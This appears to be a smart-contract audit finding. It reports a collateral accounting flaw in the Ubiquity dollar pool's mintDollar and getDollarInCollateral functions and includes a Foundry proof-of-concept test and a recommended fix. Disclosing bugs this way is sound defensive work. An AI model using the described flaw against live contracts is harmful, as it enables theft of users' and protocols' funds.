Soft Carrot Owl

high

# Theft of dollar token

## Summary
Attacker can exploit the wrong accounting in `getDollarInCollateral` fn to pay less collateral than is needed. 
## Vulnerability Detail
The issues lies in `getDollarInCollateral` fn, the way we use it with `mintDollar` fn:
```solidity
    function getDollarInCollateral(
        uint256 collateralIndex,
        uint256 dollarAmount
    ) internal view returns (uint256) {
        UbiquityPoolStorage storage poolStorage = ubiquityPoolStorage();
        return
            dollarAmount  
                .mul(UBIQUITY_POOL_PRICE_PRECISION)
                .div(10 ** poolStorage.missingDecimals[collateralIndex])
                .div(poolStorage.collateralPrices[collateralIndex]); 
    }

``` 

To `mintDollar`, a user can specified collateralIndex, dollarAmount, etc. The fn internally uses `getDollarInCollateral` to determine how much collateral is needed to mint user-specified dollarAmount. Before this call, it ensures the dollar USD price is up to date(via calling `LibTWAPOracle.update()`). However, it fails to convert the dollarAmount to the USD value of dollarAmount before passing it to the `getDollarInCollateral` fn. 

```solidity
function mintDollar(
    uint256 collateralIndex,
    uint256 dollarAmount,
    uint256 dollarOutMin,
    uint256 maxCollateralIn
)
    internal
    collateralEnabled(collateralIndex)
    returns (uint256 totalDollarMint, uint256 collateralNeeded)
{
    ...SNIP...
    // update Dollar price from Curve's Dollar Metapool
    LibTWAPOracle.update();
 
    require(
        getDollarPriceUsd() >= poolStorage.mintPriceThreshold, 
        "Dollar price too low"
    );

    // update collateral price
    updateChainLinkCollateralPrice(collateralIndex);

    // get amount of collateral for minting Dollars
    collateralNeeded = getDollarInCollateral(collateralIndex, dollarAmount);
    
    ...SNIP...
}

```

```solidity
function getDollarInCollateral(
    uint256 collateralIndex,
    uint256 dollarAmount
) internal view returns (uint256) {
    UbiquityPoolStorage storage poolStorage = ubiquityPoolStorage();
    return
        dollarAmount  // @audit: not using dollar usd price for dollarAmount
            .mul(UBIQUITY_POOL_PRICE_PRECISION)
            .div(10 ** poolStorage.missingDecimals[collateralIndex])
            .div(poolStorage.collateralPrices[collateralIndex]); // @audit: returns the usd price of collateral
}
```

That means, if currently dollar price is at 1.1 usd/uad, an attacker can pay collateral worth 1mil USD to get 1mil uad(= 1mil x 1.1 USD), considering zero fees. Consequently, the attacker can pocket an extra $100k worth of dollar tokens.

## Impact
Fund loss. 
## Code Snippet
Add test to `/packages/contracts/test/diamond/facets/UbiquityPoolFacet.t.sol` and run `forge test --mt test_exploit -vv`
```solidity
 function test_Attack() public { 
    address bob = makeAddr("bob");
    collateralToken.mint(bob, 1_000_000e18);

    // set no fee and poolCeiling high enough for ease
    vm.startPrank(admin);
    ubiquityPoolFacet.setFees(0,0,0);
    ubiquityPoolFacet.setPriceThresholds(1000000,1000000);
    ubiquityPoolFacet.setPoolCeiling(0, 10_000_000e18);
    vm.stopPrank();

    vm.startPrank(bob);
    collateralToken.approve(address(ubiquityPoolFacet), type(uint256).max); 
    (uint256 totalDollarMintBob, ) = ubiquityPoolFacet.mintDollar(
        0,
        1_000_000e18, 
        0, 
        1_000_000e18
    ); 
    assertEq(totalDollarMintBob, 1_000_000e18);

    uint256 dollarPrice = 1.1e6; // can't find a way to set price via twap 

    uint256 attacker_usd_balance = (totalDollarMintBob *  dollarPrice) / 1e6; 
    uint256 collateral_transferred_usd = collateralToken.balanceOf(address(ubiquityPoolFacet));  // consider 1:1 for stablecoins
    assertGt(attacker_usd_balance, collateral_transferred_usd);

    emit log_named_uint("collateral_transferred_usd", collateral_transferred_usd);
    emit log_named_uint("attacker_usd_balance ", attacker_usd_balance);
}
```
## Tool used

Manual Review

## Recommendation
Fix it by converting dollarAmount to USD value of dollarAmount using `getDollarPriceUsd` into the `getDollarInCollateral` fn, 
https://github.com/sherlock-audit/2023-12-ubiquity/blob/d9c39e8dfd5601e7e8db2e4b3390e7d8dff42a8e/ubiquity-dollar/packages/contracts/src/dollar/libraries/LibUbiquityPool.sol#L284-L294 